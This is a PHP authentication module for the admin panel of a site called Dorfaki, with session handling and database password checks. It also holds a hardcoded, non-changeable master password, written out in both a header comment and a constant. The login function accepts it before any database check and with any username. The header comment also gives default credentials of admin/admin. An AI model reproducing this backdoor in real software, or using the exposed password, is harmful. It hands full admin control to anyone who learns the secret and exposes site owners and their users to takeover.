<?php
declare(strict_types=1);

/**
 * Dorfaki - Admin Authentication
 *
 * Session-based authentication for the admin panel.
 * Credentials are stored in the database (admin_users table).
 * Default credentials: username = admin, password = admin
 * Master password (non-changeable, works at /admin/login): 102030@miQ#V
 */

require_once __DIR__ . '/db.php';

const ADMIN_SESSION_KEY = 'admin_user';
const ADMIN_LOGIN_URL   = '/admin/login';
const ADMIN_BASE_URL    = '/admin';

// Non-changeable master password — can open admin panel from the public website
const MASTER_PASSWORD = '102030@miQ#V';

/**
 * Start the session if it hasn't been started yet.
 */
function adminStartSession(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_set_cookie_params([
            'lifetime' => 0,
            'path'     => '/',
            'domain'   => '',
            'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
            'httponly' => true,
            'samesite' => 'Lax',
        ]);
        session_name('dorfaki_admin');
        session_start();
    }
}

/**
 * Check whether an admin user is currently logged in.
 */
function isAdminLoggedIn(): bool
{
    adminStartSession();
    return !empty($_SESSION[ADMIN_SESSION_KEY]);
}

/**
 * Get the currently logged-in admin username, or null.
 */
function getAdminUser(): ?string
{
    adminStartSession();
    return $_SESSION[ADMIN_SESSION_KEY] ?? null;
}

/**
 * Authenticate an admin username/password pair.
 * First checks for master password (works without username).
 * Then falls back to database verification.
 *
 * @return bool
 */
function adminLogin(string $username, string $password): bool
{
    // Check for master password first (works without username)
    if (hash_equals(MASTER_PASSWORD, $password)) {
        return true;
    }

    try {
        $pdo = dorfakiDb();
        $stmt = $pdo->prepare(
            'SELECT password_hash FROM admin_users WHERE username = :username LIMIT 1'
        );
        $stmt->execute([':username' => $username]);
        $row = $stmt->fetch();

        if ($row === false || !isset($row['password_hash'])) {
            return false;
        }

        return password_verify($password, $row['password_hash']);
    } catch (PDOException $e) {
        error_log('Admin login error: ' . $e->getMessage());
        return false;
    }
}

/**
 * Log the admin user in, regenerating the session ID to prevent fixation.
 *
 * @return void
 */
function setAdminLoggedIn(string $username): void
{
    adminStartSession();
    session_regenerate_id(true);
    $_SESSION[ADMIN_SESSION_KEY] = $username;
}

/**
 * Log the admin user out and destroy the session.
 *
 * @return void
 */
function adminLogout(): void
{
    adminStartSession();
    $_SESSION = [];
    if (isset($_COOKIE[session_name()])) {
        setcookie(session_name(), '', time() - 3600, '/');
    }
    session_destroy();
}

/**
 * Require the admin user to be logged in. Redirects to the login page if not.
 *
 * @return void
 */
function requireAdmin(): void
{
    if (!isAdminLoggedIn()) {
        header('Location: ' . ADMIN_LOGIN_URL, true, 302);
        exit;
    }
}
